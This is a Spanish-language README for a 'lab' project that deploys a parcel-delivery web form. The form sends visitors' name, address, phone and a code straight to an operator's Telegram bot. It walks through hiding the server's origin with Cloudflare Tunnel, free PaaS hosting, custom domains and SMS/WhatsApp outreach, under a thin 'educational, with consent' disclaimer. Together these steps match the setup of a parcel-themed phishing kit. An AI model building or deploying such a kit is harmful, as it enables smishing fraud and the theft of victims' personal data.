# Paquetería → Telegram (Laboratorio educativo, sin BD)

**Objetivo:** Demostrar cómo un formulario web en Spring Boot puede enviar datos directamente a un **bot de Telegram** sin guardar nada en base de datos.  
**⚠️ Ética y legalidad:** Solo para prácticas en **entornos controlados y con consentimiento explícito**. No uses datos reales ni para fines maliciosos.

---

## Estructura de carpetas
```text
paqueteria-telegram-lab/
├─ pom.xml
├─ Dockerfile
├─ README.md
└─ src/
   └─ main/
      ├─ java/
      │  └─ com/paq/lab/
      │     ├─ PaqTelegramLabApplication.java
      │     ├─ config/
      │     │  └─ CorsConfig.java
      │     ├─ controller/
      │     │  └─ FormController.java
      │     ├─ dto/
      │     │  └─ FormData.java
      │     └─ service/
      │        └─ TelegramService.java
      └─ resources/
         ├─ application.properties
         └─ static/
            ├─ index.html
            └─ thanks.html
```

---

## Variables de entorno requeridas
- `TELEGRAM_BOT_TOKEN` – token de @BotFather
- `TELEGRAM_CHAT_ID` – tu chat ID (o de un grupo)

---

## Ejecutar local (Java 21 + Maven)
1. Exporta variables:
   - Linux/macOS:
     ```bash
     export TELEGRAM_BOT_TOKEN="123:ABC"
     export TELEGRAM_CHAT_ID="123456789"
     ```
   - Windows PowerShell:
     ```powershell
     setx TELEGRAM_BOT_TOKEN "123:ABC"
     setx TELEGRAM_CHAT_ID "123456789"
     # Cierra y abre una terminal nueva para que apliquen
     ```
2. Instala dependencias y arranca:
   ```bash
   mvn spring-boot:run
   ```
3. Abre: <http://localhost:8080>

---

## Docker (opcional)
```bash
docker build -t paq-telegram-lab .
docker run -p 8080:8080 \
  -e TELEGRAM_BOT_TOKEN="123:ABC" \
  -e TELEGRAM_CHAT_ID="123456789" \
  paq-telegram-lab
```

---

## Cloudflare Tunnel (anonimizar origen, gratis)
1. Instala cloudflared (Win/macOS/Linux).  
2. Con el servidor corriendo en `http://localhost:8080`, expón un túnel rápido:
   ```bash
   cloudflared tunnel --url http://localhost:8080
   ```
3. Cloudflare te dará una URL pública (`https://algo.trycloudflare.com`). Compártela solo en tu laboratorio.

> Para dominio propio detrás de Cloudflare: apunta un **CNAME** desde tu dominio a la URL de tu PaaS (Render/Railway), activa el **proxy naranja**, y habilita SSL/TLS en modo **Full**.

---

## Despliegue rápido en Render/Railway (gratuito)
1. Sube este proyecto a un repositorio en GitHub.
2. Crea un **Web Service**:
   - **Runtime:** Docker o Java 21.
   - **Build:** `./mvnw -v || (apt-get update && apt-get install -y maven) && mvn -DskipTests package`
   - **Start:** `java -jar target/*.jar`
3. Configura variables de entorno `TELEGRAM_BOT_TOKEN` y `TELEGRAM_CHAT_ID`.
4. Abre la URL del servicio (ej: `https://tu-app.onrender.com`).

---

## Endpoints
- `GET /` → sirve `index.html`
- `POST /api/submit` → JSON
  ```json
  { "nombre":"...", "direccion":"...", "telefono":"...", "codigo":"..." }
  ```
- `POST /form/submit` → `application/x-www-form-urlencoded` (form clásico) → redirige a `/thanks.html`

---

## Seguridad básica y buenas prácticas
- El formulario muestra un **banner de DEMO** para evitar uso indebido.
- No se almacena nada en BD; los datos se envían a Telegram y listo.
- Usa siempre HTTPS (Cloudflare / PaaS).
- Evita spam o mensajes masivos no solicitados. Para WhatsApp/SMS, emplea **opt-in** (p. ej. Twilio sandbox) solo con quienes acepten participar en el laboratorio.

---

## Troubleshooting
- No llega el mensaje:
  - Verifica `TELEGRAM_BOT_TOKEN` y `TELEGRAM_CHAT_ID`.
  - Chatea con tu bot primero (o añade el bot al grupo).
  - Revisa logs de la app.
- CORS en front externo: el endpoint `/api/**` permite orígenes `*` para POST.
- Render/Railway: asegúrate de configurar variables de entorno y el puerto (`$PORT`).

---

Hecho con ❤️ para prácticas educativas.
